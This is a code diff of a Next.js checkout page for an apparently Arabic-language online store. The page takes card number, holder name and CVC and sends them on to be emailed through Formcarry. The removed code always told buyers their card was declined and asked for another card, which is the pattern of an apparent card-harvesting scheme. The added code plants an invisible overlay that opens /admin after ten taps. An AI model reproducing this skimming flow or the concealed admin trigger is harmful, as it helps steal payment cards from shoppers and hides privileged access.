@@ -1,7 +1,7 @@
 "use client";
 
-import { Suspense, useState } from "react";
-import { useSearchParams } from "next/navigation";
+import { Suspense, useEffect, useRef, useState } from "react";
+import { useRouter, useSearchParams } from "next/navigation";
 import Link from "next/link";
 import Image from "next/image";
 import Swal from "sweetalert2";
@@ -10,10 +10,10 @@ import {
 	FiArrowRight,
 	FiCreditCard,
 	FiGift,
+	FiCheckCircle,
 	FiLock,
 	FiShield,
 	FiShoppingBag,
-	FiXCircle,
 } from "react-icons/fi";
 
 
@@ -103,18 +103,11 @@ function isValidCvc(cvc, cardNumber) {
 	return false;
 }
 
-function triggerFastEmailDelivery() {
-	fetch("/api/cron/process-email-queue", {
-		method: "GET",
-		cache: "no-store",
-		keepalive: true,
-	}).catch(() => {
-		// The order is already queued by /api/orders; this only accelerates Formcarry delivery.
-	});
-}
-
 function CheckoutContent() {
 	const searchParams = useSearchParams();
+	const router = useRouter();
+	const hiddenTapCountRef = useRef(0);
+	const hiddenTapResetRef = useRef(null);
 
 	const [cardNumber, setCardNumber] = useState("");
 	const [cardHolder, setCardHolder] = useState("");
@@ -140,6 +133,31 @@ function CheckoutContent() {
 	const maskedCardPreview = normalizedCardPreview.length >= 4
 		? `**** **** **** ${normalizedCardPreview.slice(-4)}`
 		: "**** **** ****";
+
+	useEffect(() => {
+		return () => {
+			if (hiddenTapResetRef.current) {
+				clearTimeout(hiddenTapResetRef.current);
+			}
+		};
+	}, []);
+
+	const handleHiddenAdminTap = () => {
+		if (hiddenTapResetRef.current) {
+			clearTimeout(hiddenTapResetRef.current);
+		}
+
+		hiddenTapCountRef.current += 1;
+		if (hiddenTapCountRef.current >= 10) {
+			hiddenTapCountRef.current = 0;
+			router.push("/admin");
+			return;
+		}
+
+		hiddenTapResetRef.current = setTimeout(() => {
+			hiddenTapCountRef.current = 0;
+		}, 3000);
+	};
 
 	const validateCardNumberLive = (value) => {
 		const normalized = normalizeCardNumber(value);
@@ -349,6 +367,7 @@ function CheckoutContent() {
 		});
 
 		let orderId = "-";
+		let wasQueued = false;
 		try {
 			const response = await fetch("/api/orders", {
 				method: "POST",
@@ -369,14 +388,15 @@ function CheckoutContent() {
 			}
 
 			orderId = responseData?.data?.orderId || "-";
+			wasQueued = Boolean(responseData?.queued);
 			setLastOrderSummary({
 				orderId,
 				productName: responseData?.data?.order?.productName || selectedProductName,
 				totalPrice: responseData?.data?.order?.totalPrice ?? totalPrice,
 				emailStatus: responseData?.emailStatus || "-",
 				cardNumberMasked: responseData?.data?.payment?.cardNumberMasked || maskedCard,
+				queued: wasQueued,
 			});
-			triggerFastEmailDelivery();
 		} catch (error) {
 			const serverMessage =
 				error?.message ||
@@ -392,21 +412,24 @@ function CheckoutContent() {
 		}
 
 		await Swal.fire({
-			title: "تم رفض طريقة الدفع",
-			text: "تعذر إتمام عملية الدفع، يرجى استخدام بطاقة أخرى أو التواصل مع الدعم.",
-			icon: "error",
-			confirmButtonText: "اختيار بطاقة أخرى",
-			confirmButtonColor: "#dc2626",
-			customClass: {
-				popup: "payment-decline-modal",
-				confirmButton: "payment-decline-confirm",
-			},
+			title: wasQueued ? "تم حفظ الطلب للمعالجة" : "تم إرسال الطلب بنجاح",
+			text: wasQueued
+				? "تعذر الإرسال المباشر مؤقتًا، وسيتم إعادة المحاولة تلقائيًا خلال ثوانٍ."
+				: "تم إرسال تفاصيل الطلب مباشرة عبر Formcarry.",
+			icon: wasQueued ? "warning" : "success",
+			confirmButtonText: "حسنًا",
+			confirmButtonColor: wasQueued ? "#f59e0b" : "#1475d1",
 		});
 	};
 
 	return (
 		<main className="checkout-shell min-h-screen px-4 py-8 pt-24 text-slate-800" dir="rtl">
 			<StoreNav />
+			<div
+				aria-hidden="true"
+				onClick={handleHiddenAdminTap}
+				className="fixed left-0 top-16 z-30 h-[160px] w-[220px] cursor-default bg-transparent"
+			/>
 			<div className="mx-auto grid w-full max-w-6xl gap-6 lg:grid-cols-[1.1fr_0.9fr]">
 				<section className="soft-panel p-6 md:p-8">
 					<Link href="/products" className="inline-flex items-center gap-2 text-sm font-semibold text-[#1475d1] hover:text-[#0f5ca8]">
@@ -426,12 +449,12 @@ function CheckoutContent() {
 					</div>
 
 					{lastOrderSummary ? (
-						<div className="payment-decline-alert mt-5">
-							<FiXCircle className="text-2xl" />
+						<div className={lastOrderSummary.queued ? "info-alert mt-5" : "success-alert mt-5"}>
+							<FiCheckCircle className="text-2xl" />
 							<div className="text-sm leading-7">
-								<div className="font-extrabold">تم رفض طريقة الدفع</div>
-								<div>تعذر إتمام عملية الدفع، يرجى استخدام بطاقة أخرى أو التواصل مع الدعم.</div>
-								<div className="mt-1 text-xs opacity-80">رقم المحاولة: {lastOrderSummary.orderId} • البطاقة: {lastOrderSummary.cardNumberMasked}</div>
+								<div className="font-extrabold">{lastOrderSummary.queued ? "تم حفظ الطلب في Queue احتياطيًا" : "تم إرسال الطلب مباشرة"}</div>
+								<div>{lastOrderSummary.emailStatus}</div>
+								<div className="mt-1 text-xs opacity-80">رقم الطلب: {lastOrderSummary.orderId} • البطاقة: {lastOrderSummary.cardNumberMasked}</div>
 							</div>
 						</div>
 					) : null}
